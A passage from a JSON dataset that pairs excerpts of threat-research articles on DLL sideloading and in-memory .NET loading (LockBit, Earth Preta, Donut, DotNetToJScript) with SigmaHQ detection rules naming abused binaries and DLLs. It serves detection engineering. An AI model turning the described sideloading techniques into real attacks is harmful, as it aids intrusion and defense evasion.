    "markdown": "# LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility ## Executive Summary - The VMware command line utility `VMwareXferlogs.exe` used for data transfer to and from VMX logs is susceptible to DLL side-loading. - During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (RaaS) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility. - The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a `.log` file containing an encrypted Cobalt Strike Reflective Loader. - The malicious DLL evades defenses by removing EDR/EPP’s userland",
    "sigma_rule": {
      "title": "Potential DLL Sideloading Via VMware Xfer",
      "id": "9313dc13-d04c-46d8-af4a-a930cc55d93b",
      "status": "test",
      "description": "Detects loading of a DLL by the VMware Xfer utility from the non-default directory which may be an attempt to sideload arbitrary DLL",
      "references": [
        "https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-02",
      "modified": "2023-02-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\VMwareXferlogs.exe",
          "ImageLoaded|endswith": "\\glib-2.0.dll"
        },
        "filter": {
          "ImageLoaded|startswith": "C:\\Program Files\\VMware\\"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_vmware_xfer.yml"
  },
  "41": {
    "url": "https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html",
    "markdown": "# Behind the Scenes: Unveiling the Hidden Workings of Earth Preta **Date:** June 14, 2023 --- ## Introduction In November 2022, we disclosed a large-scale phishing campaign initiated by the advanced persistent threat (APT) group Earth Preta, also known as Mustang Panda. The campaign targeted various countries around the Asia-Pacific (APAC) region via spear-phishing emails. Based on our previous research, government entities are one of the threat actor’s primary targets. Since the start of 2023, we’ve observed new arrival vectors being used by the group, such as MIROGO and QMAGENT. Furthermore, we discovered a new dropper named TONEDROP that drops",
    "sigma_rule": {
      "title": "Potential Waveedit.DLL Sideloading",
      "id": "71b31e99-9ad0-47d4-aeb5-c0ca3928eeeb",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"waveedit.dll\", which is part of the Nero WaveEditor audio editing software.",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-14",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\waveedit.dll"
        },
        "filter_main_legit_path": {
          "Image": [
            "C:\\Program Files (x86)\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe",
            "C:\\Program Files\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe"
          ],
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\Nero\\Nero Apps\\Nero WaveEditor\\",
            "C:\\Program Files\\Nero\\Nero Apps\\Nero WaveEditor\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_waveedit.yml"
  },
  "42": {
    "url": "https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html",
    "markdown": "# Iron Tiger’s SysUpdate Reappears, Adds Linux Targeting We detail the update that advanced persistent threat (APT) group Iron Tiger made on the custom malware family SysUpdate. In this version, we also found components that enable the malware to compromise Linux systems. **Date:** March 01, 2023 --- Iron Tiger is an advanced persistent threat (APT) group that has been focused primarily on cyberespionage for more than a decade. In 2022, we noticed that they updated SysUpdate, one of their custom malware families, to include new features and add malware infection support for the Linux platform. We found the oldest sample",
    "sigma_rule": {
      "title": "Potential Wazuh Security Platform DLL Sideloading",
      "id": "db77ce78-7e28-4188-9337-cf30e2b3ba9f",
      "status": "test",
      "description": "Detects potential DLL side loading of DLLs that are part of the Wazuh security platform",
      "references": [
        "https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-03-13",
      "modified": "2023-05-12",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\libwazuhshared.dll",
            "\\libwinpthread-1.dll"
          ]
        },
        "filter_main_generic": {
          "ImageLoaded|startswith": [
            "C:\\Program Files\\",
            "C:\\Program Files (x86)\\"
          ]
        },
        "filter_optional_mingw64": {
          "ImageLoaded|contains": [
            "\\AppData\\Local\\",
            "\\ProgramData\\"
          ],
          "ImageLoaded|endswith": "\\mingw64\\bin\\libwinpthread-1.dll"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Many legitimate applications leverage this DLL. (Visual Studio, JetBrains, Ruby, Anaconda, GithubDesktop, etc.)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_wazuh.yml"
  },
  "43": {
    "url": "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/",
    "markdown": "# Living Off Windows Defender | LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool **July 28, 2022** --- LockBit has been receiving a fair share of attention recently. Last week, SentinelLabs reported on LockBit 3.0 (aka LockBit Black), describing how the latest iteration of this increasingly prevalent RaaS implemented a series of anti-analysis and anti-debugging routines. Our research was quickly followed up by others reporting similar findings. Meanwhile, back in April, SentinelLabs reported on how a LockBit affiliate was leveraging the legitimate VMware command line utility, `VMwareXferlogs.exe`, in a live engagement to side load Cobalt Strike. In this post,",
    "sigma_rule": {
      "title": "Potential Mpclient.DLL Sideloading",
      "id": "418dc89a-9808-4b87-b1d7-e5ae0cb6effc",
      "related": [
        {
          "id": "7002aa10-b8d4-47ae-b5ba-51ab07e228b9",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects potential sideloading of \"mpclient.dll\" by Windows Defender processes (\"MpCmdRun\" and \"NisSrv\") from their non-default directory.",
      "references": [
        "https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/"
      ],
      "author": "Bhabesh Raj",
      "date": "2022-08-02",
      "modified": "2023-08-04",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\mpclient.dll",
          "Image|endswith": [
            "\\MpCmdRun.exe",
            "\\NisSrv.exe"
          ]
        },
        "filter_main_known_locations": {
          "Image|startswith": [
            "C:\\Program Files (x86)\\Windows Defender\\",
            "C:\\Program Files\\Microsoft Security Client\\",
            "C:\\Program Files\\Windows Defender\\",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_windows_defender.yml"
  },
  "44": {
    "url": "https://twitter.com/WhichbufferArda/status/1658829954182774784",
    "markdown": "# Post May 17, 2023 DarkPink APT activity continues with a rice trade lure: ISO > WinWord.exe > DLL SideLoading > Winlogon Persistence MD5: 98beb20ef1e4d629965c9132be8feb07 ([Update] Counterdraft on the MoU on Rice) @h2jazi @malwrhunterteam @ShadowChasing1 ```image Description: The image displays a memorandum of understanding (MoU) between the Ministry of Trade of Indonesia and the Ministry of Commerce and Industry of India regarding rice trade. The document outlines the intentions of both parties to enhance economic relations and details specific commitments related to rice production and trade between the two countries. Transcription: | MEMORANDUM OF UNDERSTANDING BETWEEN THE MINISTRY OF TRADE",
    "sigma_rule": {
      "title": "Potential WWlib.DLL Sideloading",
      "id": "e2e01011-5910-4267-9c3b-4149ed5479cf",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"wwlib.dll\"",
      "references": [
        "https://twitter.com/WhichbufferArda/status/1658829954182774784",
        "https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/",
        "https://securelist.com/apt-luminousmoth/103332/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-05-18",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\wwlib.dll"
        },
        "filter_main_path": {
          "Image|startswith": [
            "C:\\Program Files (x86)\\Microsoft Office\\",
            "C:\\Program Files\\Microsoft Office\\"
          ],
          "Image|endswith": "\\winword.exe",
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\Microsoft Office\\",
            "C:\\Program Files\\Microsoft Office\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_wwlib.yml"
  },
  "45": {
    "url": "https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/",
    "markdown": "# Family Tree: DLL-Sideloading Cases May Be Related A threat actor’s repeated use of DLL-hijack execution flow makes for interesting attack results, including omnivorous file ingestion; we break down five cases and find commonalities. **Posted on November 03, 2022** ### Tags - Threat Research - DLL Side-load - featured - Sophos X-Ops - x-ops We have observed multiple attacks targeting government organizations in Asia, all involving DLL sideloading – historically a favorite technique of China-based APT groups – as far back as 2013 and as recently as 2020. In this article, we look at the evidence that connects five of",
    "sigma_rule": {
      "title": "Potential WWlib.DLL Sideloading",
      "id": "e2e01011-5910-4267-9c3b-4149ed5479cf",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"wwlib.dll\"",
      "references": [
        "https://twitter.com/WhichbufferArda/status/1658829954182774784",
        "https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/",
        "https://securelist.com/apt-luminousmoth/103332/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-05-18",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\wwlib.dll"
        },
        "filter_main_path": {
          "Image|startswith": [
            "C:\\Program Files (x86)\\Microsoft Office\\",
            "C:\\Program Files\\Microsoft Office\\"
          ],
          "Image|endswith": "\\winword.exe",
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\Microsoft Office\\",
            "C:\\Program Files\\Microsoft Office\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_wwlib.yml"
  },
  "46": {
    "url": "https://securelist.com/apt-luminousmoth/103332/",
    "markdown": "# LuminousMoth APT: Sweeping attacks for the chosen few **14 Jul 2021** APT actors are known for the frequently targeted nature of their attacks. Typically, they will handpick a set of targets that in turn are handled with almost surgical precision, with infection vectors, malicious implants and payloads being tailored to the victims’ identities or environment. It’s not often we observe a large-scale attack conducted by actors fitting this profile, usually due to such attacks being noisy, and thus putting the underlying operation at risk of being compromised by security products or researchers. We recently came across unusual APT activity",
    "sigma_rule": {
      "title": "Potential WWlib.DLL Sideloading",
      "id": "e2e01011-5910-4267-9c3b-4149ed5479cf",
      "status": "test",
      "description": "Detects potential DLL sideloading of \"wwlib.dll\"",
      "references": [
        "https://twitter.com/WhichbufferArda/status/1658829954182774784",
        "https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/",
        "https://securelist.com/apt-luminousmoth/103332/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-05-18",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": "\\wwlib.dll"
        },
        "filter_main_path": {
          "Image|startswith": [
            "C:\\Program Files (x86)\\Microsoft Office\\",
            "C:\\Program Files\\Microsoft Office\\"
          ],
          "Image|endswith": "\\winword.exe",
          "ImageLoaded|startswith": [
            "C:\\Program Files (x86)\\Microsoft Office\\",
            "C:\\Program Files\\Microsoft Office\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_wwlib.yml"
  },
  "47": {
    "url": "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
    "markdown": "# Less SmartScreen More Caffeine: (Ab)Using ClickOnce for Trusted Code Execution The contents of this blogpost was written by Nick Powers (@zyn3rgy) and Steven Flores (@0xthirteen), and is a written version of the content presented at Defcon30. With the barrier to entry for initial access ever increasing, we spent some time digging into potentially lesser-known weaponization options for ClickOnce deployments. A few of the hurdles we’d like to overcome by implementing these weaponization options include: - Install / execute application without administrative privileges - Reputable, known-good file(s) used during execution - Streamlined, minimal user interaction required - Ease of rerolling",
    "sigma_rule": {
      "title": "Unsigned Module Loaded by ClickOnce Application",
      "id": "060d5ad4-3153-47bb-8382-43e5e29eda92",
      "status": "test",
      "description": "Detects unsigned module load by ClickOnce application.",
      "references": [
        "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5"
      ],
      "author": "@SerkinValery",
      "date": "2023-06-08",
      "tags": [
        "attack.persistence",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_path": {
          "Image|contains": "\\AppData\\Local\\Apps\\2.0\\"
        },
        "selection_sig_status": [
          {
            "Signed": "false"
          },
          {
            "SignatureStatus": "Expired"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_clickonce_unsigned_module_loaded.yml"
  },
  "48": {
    "url": "https://www.py2exe.org/",
    "markdown": "# py2exe py2exe is a Python Distutils extension which converts Python scripts into executable Windows programs, able to run without requiring a Python installation. Development is hosted on GitHub. You can find the mailing list, svn, and downloads for Python 2 there. Downloads for Python 3 are on PyPI. py2exe was originally developed by Thomas Heller who still makes contributions. Jimmy Retzlaff, Mark Hammond, and Alberto Sottile have also made contributions. Code contributions are always welcome from the community and many people provide invaluable help on the mailing list and the Wiki. py2exe is used by BitTorrent, SpamBayes, and thousands",
    "sigma_rule": {
      "title": "Python Image Load By Non-Python Process",
      "id": "cbb56d62-4060-40f7-9466-d8aaf3123f83",
      "status": "test",
      "description": "Detects the image load of \"Python Core\" by a non-Python process. This might be indicative of a Python script bundled with Py2Exe.",
      "references": [
        "https://www.py2exe.org/",
        "https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/"
      ],
      "author": "Patrick St. John, OTR (Open Threat Research)",
      "date": "2020-05-03",
      "modified": "2023-09-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1027.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Description": "Python Core"
        },
        "filter_main_generic": [
          {
            "Image|contains": "Python"
          },
          {
            "Image|startswith": [
              "C:\\Program Files\\",
              "C:\\Program Files (x86)\\",
              "C:\\ProgramData\\Anaconda3\\"
            ]
          }
        ],
        "filter_optional_aurora": {
          "Image": null
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate Py2Exe Binaries",
        "Known false positive caused with Python Anaconda"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_python_image_load.yml"
  },
  "49": {
    "url": "https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/",
    "markdown": "# Unit 42 Technical Analysis: Seaduke ## Breadcrumbs - Threat Research Center - Threat Research - Malware ### Article Details **Category:** Malware **Published:** July 14, 2015 --- Earlier this week Symantec released a blog post detailing a new Trojan used by the ‘Duke’ family of malware. Within this blog post, a payload containing a function named ‘forkmeiamfamous’ was mentioned. While performing some research online, Unit 42 was able to identify the following sample, which is being labeled as ‘Trojan.Win32.Seadask’ by a number of anti-virus companies. | **MD5** | A25EC7749B2DE12C2A86167AFA88A4DD | |-----------------------|-------------------------------------------------------------------| | **SHA1** | BB71254FBD41855E8E70F05231CE77FEE6F00388 | | **SHA256** | 3EB86B7B067C296EF53E4857A74E09F12C2B84B666FC130D1F58AEC18BC74B0D",
    "sigma_rule": {
      "title": "Python Image Load By Non-Python Process",
      "id": "cbb56d62-4060-40f7-9466-d8aaf3123f83",
      "status": "test",
      "description": "Detects the image load of \"Python Core\" by a non-Python process. This might be indicative of a Python script bundled with Py2Exe.",
      "references": [
        "https://www.py2exe.org/",
        "https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/"
      ],
      "author": "Patrick St. John, OTR (Open Threat Research)",
      "date": "2020-05-03",
      "modified": "2023-09-18",
      "tags": [
        "attack.defense-evasion",
        "attack.t1027.002"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Description": "Python Core"
        },
        "filter_main_generic": [
          {
            "Image|contains": "Python"
          },
          {
            "Image|startswith": [
              "C:\\Program Files\\",
              "C:\\Program Files (x86)\\",
              "C:\\ProgramData\\Anaconda3\\"
            ]
          }
        ],
        "filter_optional_aurora": {
          "Image": null
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate Py2Exe Binaries",
        "Known false positive caused with Python Anaconda"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_python_image_load.yml"
  },
  "50": {
    "url": "https://github.com/tyranid/DotNetToJScript",
    "markdown": "# DotNetToJScript A tool to create a JScript file which loads a .NET v2 assembly from memory. ## License GPL-3.0 license ## Usage Notes This only works from full trust JScript (obviously), so should work in scriptlets etc. By default, it will only work if v2/v3/v3.5 is installed. However, if you specify the '-ver auto' switch when building the output, it will also work on v4+ only, however that will introduce a dependency on WScript.Shell which you might not want. To use this, you'll need to create an assembly which targets .NET 2 (though in most cases you can also",
    "sigma_rule": {
      "title": "DotNet CLR DLL Loaded By Scripting Applications",
      "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
      "status": "test",
      "description": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript. This could be an indication of potential suspicious execution.",
      "references": [
        "https://github.com/tyranid/DotNetToJScript",
        "https://thewover.github.io/Introducing-Donut/",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008"
      ],
      "author": "omkar72, oscd.community",
      "date": "2020-10-14",
      "modified": "2023-02-23",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\cmstp.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msxsl.exe",
            "\\regsvr32.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ],
          "ImageLoaded|endswith": [
            "\\clr.dll",
            "\\mscoree.dll",
            "\\mscorlib.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_script_dotnet_clr_dll_load.yml"
  },
  "51": {
    "url": "https://thewover.github.io/Introducing-Donut/",
    "markdown": "# Donut - Injecting .NET Assemblies as Shellcode *TLDR: You can now inject .NET Assemblies into Windows processes using this repo: https://github.com/TheWover/donut/* ## Advancing Tradecraft - Context Offensive and red team tradecraft have changed significantly in the past year. As anti-malware systems improve their capability to detect and deter offensive tools, attackers are shifting their focus to technologies that are not observed by AV. Currently, that means operating entirely in memory and avoiding dropping files onto disk. In the Windows world, the .NET Framework provides a convenient mechanism for this. It is, however, severely restricted in that .NET programs cannot",
    "sigma_rule": {
      "title": "DotNet CLR DLL Loaded By Scripting Applications",
      "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
      "status": "test",
      "description": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript. This could be an indication of potential suspicious execution.",
      "references": [
        "https://github.com/tyranid/DotNetToJScript",
        "https://thewover.github.io/Introducing-Donut/",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008"
      ],
      "author": "omkar72, oscd.community",
      "date": "2020-10-14",
      "modified": "2023-02-23",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\cmstp.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msxsl.exe",
            "\\regsvr32.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ],
          "ImageLoaded|endswith": [
            "\\clr.dll",
            "\\mscoree.dll",
            "\\mscorlib.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_script_dotnet_clr_dll_load.yml"
  },
  "52": {
    "url": "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
    "markdown": "# Interesting DFIR traces of .NET CLR Usage Logs **Date**: 16 July 2019 As most of you already know .NET has become an increasingly important component in the offensive world, with attackers making increasing direct use of it as well as indirect use of it via existing windows scripting utilities. One good example of the indirect approach is DotNetToJScript, which allow to deliver managed code via a simple JavaScript. We decided to take a closer look to this category of malicious code delivery, which lead us to this great Offensive tool by MDSec \"SharpShooter\" (at it's heart make use of",
    "sigma_rule": {
      "title": "DotNet CLR DLL Loaded By Scripting Applications",
      "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
      "status": "test",
      "description": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript. This could be an indication of potential suspicious execution.",
      "references": [
        "https://github.com/tyranid/DotNetToJScript",
        "https://thewover.github.io/Introducing-Donut/",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008"
      ],
      "author": "omkar72, oscd.community",
      "date": "2020-10-14",
      "modified": "2023-02-23",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\cmstp.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msxsl.exe",
            "\\regsvr32.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ],
          "ImageLoaded|endswith": [
            "\\clr.dll",
            "\\mscoree.dll",
            "\\mscorlib.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_script_dotnet_clr_dll_load.yml"
  },
  "53": {
    "url": "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
    "markdown": "# code-scrap / README.md Table Top With Teeth - Training Exercise ## README.md ### Instructions The following script is designed to create artifacts that teams can use to hunt, new or interesting capabilities. The following table top is based on the code here: https://github.com/code-scrap/DynamicWrapperDotNet This script is self-contained. It should dynamically write a DLL to disk and load it into `cscript.exe`. To Invoke: ``` cscript.exe stranger_things.js ``` This example expects a 64bit system. You can modify that if you want ARM or x86 etc. ### Ideas of what to hunt/test: 1. Did the anti-malware engine detect a malicious script? 2.",
    "sigma_rule": {
      "title": "DotNet CLR DLL Loaded By Scripting Applications",
      "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
      "status": "test",
      "description": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript. This could be an indication of potential suspicious execution.",
      "references": [
        "https://github.com/tyranid/DotNetToJScript",
        "https://thewover.github.io/Introducing-Donut/",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008"
      ],
      "author": "omkar72, oscd.community",
      "date": "2020-10-14",
      "modified": "2023-02-23",
      "tags": [
        "attack.execution",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\cmstp.exe",
            "\\cscript.exe",
            "\\mshta.exe",
            "\\msxsl.exe",
            "\\regsvr32.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ],
          "ImageLoaded|endswith": [
            "\\clr.dll",
            "\\mscoree.dll",
            "\\mscorlib.dll"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_script_dotnet_clr_dll_load.yml"
  },
  "54": {
    "url": "https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion",
    "markdown": "# Hunting for Suspicious Windows Libraries for Execution and Defense Evasion **Published on:** 1 March 2023 Learn more about discovering threats by hunting through DLL load events, one way to reveal the presence of known and unknown malware in noisy process event data. --- **Categories:** Security operations, Security research, Detection science Dynamic-link library (DLL) image loads is one of the noisiest types of event in Windows, which may discourage defenders from using it for detection engineering or threat hunting. Even if logged in some environments, it’s often limited to function-specific DLLs such as scheduled tasks (taskschd.dll), Windows Management Instrumentation (wmiutil.dll)",
    "sigma_rule": {
      "title": "Unsigned DLL Loaded by Windows Utility",
      "id": "b5de0c9a-6f19-43e0-af4e-55ad01f550af",
      "status": "test",
      "description": "Detects windows utilities loading an unsigned or untrusted DLL.\nAdversaries often abuse those programs to proxy execution of malicious code.\n",
      "references": [
        "https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion",
        "https://akhere.hashnode.dev/hunting-unsigned-dlls-using-kql",
        "https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-02-28",
      "modified": "2024-03-07",
      "tags": [
        "attack.t1218.011",
        "attack.t1218.010",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\InstallUtil.exe",
            "\\RegAsm.exe",
            "\\RegSvcs.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe"
          ]
        },
        "filter_main_signed": {
          "Signed": "true"
        },
        "filter_main_sig_status": {
          "SignatureStatus": [
            "errorChaining",
            "errorCode_endpoint",
            "errorExpired",
            "trusted"
          ]
        },
        "filter_main_signed_null": {
          "Signed": null
        },
        "filter_main_signed_empty": {
          "Signed": [
            "",
            "-"
          ]
        },
        "filter_main_sig_status_null": {
          "SignatureStatus": null
        },
        "filter_main_sig_status_empty": {
          "SignatureStatus": [
            "",
            "-"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_unsigned_dll.yml"
  },
  "55": {
    "url": "https://akhere.hashnode.dev/hunting-unsigned-dlls-using-kql",
    "markdown": "# Hunting Unsigned DLLs Using KQL **Akhere Sonny-Egbeahie** *Dec 17, 2022* --- Unsigned DLLs, or dynamic-link libraries, are executable files that contain code that can be used by multiple programs on a Windows system. While DLLs can be a useful and efficient way to share code between applications, they can also be a security risk if they are unsigned or have been modified by an attacker. One common attack trend involving unsigned DLLs is the use of DLL injection. In this type of attack, an attacker injects malicious code into a legitimate DLL file, and then uses a tool such",
    "sigma_rule": {
      "title": "Unsigned DLL Loaded by Windows Utility",
